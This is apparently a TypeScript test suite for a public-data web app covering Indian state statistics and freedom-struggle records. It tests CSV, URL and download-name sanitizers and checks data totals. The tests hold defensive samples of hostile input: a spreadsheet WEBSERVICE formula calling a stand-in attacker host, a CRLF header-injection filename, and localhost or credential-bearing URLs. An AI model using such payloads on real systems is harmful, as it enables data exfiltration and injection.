import assert from "node:assert/strict";
import test from "node:test";
import { safeCsvCell, safeDownloadSlug } from "../lib/csv";
import { canSubmitReview } from "../lib/editor-auth";
import { assertPublicHttpsUrl } from "../lib/safe-source-probe";
import { safeSupportingUrl } from "../app/api/corrections/route";
import { GET as exportStatePacks } from "../app/api/state-packs/export/route";
import { jurisdictions } from "../lib/evidence";
import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
import { healthBedsByJurisdiction } from "../lib/health-beds";
import { ambulancesByJurisdiction } from "../lib/ambulances";
import { cellularJailProvinceRecords, cellularJailTotal, freedomRecords, freedomRegisterSources } from "../lib/freedom-records";
import { freedomEvents } from "../lib/freedom-events";

test("neutralizes spreadsheet formulas and hostile download names",()=>{
  assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
  assert.equal(safeDownloadSlug('../../bad\r\nX-Injected: yes','fallback'),'bad-x-injected-yes');
});

test("blocks private, local and credential-bearing source targets",async()=>{
  await assert.rejects(()=>assertPublicHttpsUrl("http://example.com"),/HTTPS/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://127.0.0.1/internal"),/Private/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://localhost/internal"),/Private/);
  await assert.rejects(()=>assertPublicHttpsUrl("https://user:password@example.com"),/credential-free/);
});

test("keeps publication permission server-role controlled",()=>{
  assert.equal(canSubmitReview(null,"source"),false);
  assert.equal(canSubmitReview("editor","publication"),false);
  assert.equal(canSubmitReview("reviewer","publication"),false);
  assert.equal(canSubmitReview("publisher","publication"),true);
});

test("accepts only credential-free HTTPS correction evidence links",()=>{
  assert.equal(safeSupportingUrl("https://example.gov.in/report.pdf"),"https://example.gov.in/report.pdf");
  assert.equal(safeSupportingUrl("http://example.gov.in/report.pdf"),undefined);
  assert.equal(safeSupportingUrl("https://user:pass@example.gov.in/report.pdf"),undefined);
  assert.equal(safeSupportingUrl("https://example.gov.in:8443/report.pdf"),undefined);
  assert.equal(safeSupportingUrl("https://example.gov.in/report.pdf\nInjected"),undefined);
});

test("all-state periodic packs cover exactly the jurisdiction model and preserve published totals",()=>{
  const names=jurisdictions.map(item=>item.name).sort();
  assert.equal(jurisdictions.length,36);
  assert.deepEqual(Object.keys(educationByJurisdiction).sort(),names);
  assert.deepEqual(Object.keys(vitalByJurisdiction).sort(),names);
  assert.deepEqual(Object.keys(healthBedsByJurisdiction).sort(),names);
  assert.deepEqual(Object.keys(ambulancesByJurisdiction).sort(),names);
  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.schools,0),1_471_891);
  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.enrolments,0),248_045_828);
  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.teachers,0),9_807_600);
  assert.ok(Object.values(vitalByJurisdiction).every(item=>item.birthRate>0&&item.deathRate>0&&item.infantMortalityRate>=0));
  assert.equal(Object.values(healthBedsByJurisdiction).reduce((sum,item)=>sum+item.totalBeds,0),818_661);
  assert.ok(Object.values(healthBedsByJurisdiction).every(item=>item.totalBeds>0&&item.phc>=0&&item.districtHospital>=0));
  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.totalOperational,0),28_830);
  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.advancedLifeSupport,0),3_044);
  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.basicLifeSupport,0),15_283);
  assert.ok(Object.values(ambulancesByJurisdiction).every(item=>item.totalOperational===item.advancedLifeSupport+item.basicLifeSupport+item.patientTransport+item.boats+item.bikes+item.otherVehicles));
});

test("Cellular Jail province table preserves the complete published parliamentary total",()=>{
  assert.equal(cellularJailProvinceRecords.length,9);
  assert.equal(new Set(cellularJailProvinceRecords.map(item=>item.province)).size,cellularJailProvinceRecords.length);
  assert.equal(cellularJailProvinceRecords.reduce((sum,item)=>sum+item.count,0),585);
  assert.equal(cellularJailTotal,585);
  assert.equal(cellularJailProvinceRecords.find(item=>item.province==="Bengal")?.count,398);
  assert.ok(cellularJailProvinceRecords.every(item=>item.count>0));
});

test("history registers preserve unique records, attributable sources and explicit scope",()=>{
  assert.equal(freedomRecords.length,29);
  assert.equal(new Set(freedomRecords.map(item=>item.id)).size,freedomRecords.length);
  assert.equal(new Set(freedomRegisterSources.map(item=>item.id)).size,freedomRegisterSources.length);
  assert.equal(freedomRegisterSources.length,4);
  assert.equal(freedomEvents.length,6);
  assert.equal(new Set(freedomEvents.map(item=>item.id)).size,freedomEvents.length);
  assert.ok(freedomRecords.every(item=>item.sourceUrl.startsWith("https://")&&item.reviewNote.length>20));
  assert.ok(freedomEvents.every(item=>item.sourceUrl.startsWith("https://")&&item.limitation.length>20));
  for(const name of ["Khudiram Bose","Pritilata Waddedar","Bhagat Singh","Ram Prasad Bismil","Udham Singh"]){
    assert.ok(freedomRecords.some(item=>item.name===name),`${name} profile must be present`);
  }
  assert.ok(freedomEvents.some(item=>item.title==="Jallianwala Bagh massacre"));
});

test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
  const response=await exportStatePacks();
  const csv=await response.text();
  assert.equal(csv.trim().split("\n").length,37);
  assert.match(csv,/"Maharashtra","State","108237","21375970","738114"/);
  assert.match(csv,/"education_source","vital_source"/);
  assert.match(csv,/"phc_beds","chc_beds","sub_district_hospital_beds"/);
  assert.match(csv,/"Maharashtra"[^\n]+"45291","31 March 2023"/);
  assert.match(csv,/"nhm_advanced_life_support_ambulances","nhm_basic_life_support_ambulances"/);
  assert.match(csv,/"Maharashtra"[^\n]+"233","704","0","3","30","3255","4225","30 June 2024"/);
  assert.match(response.headers.get("content-disposition")??"",/^attachment; filename=[a-z0-9.-]+$/);
});
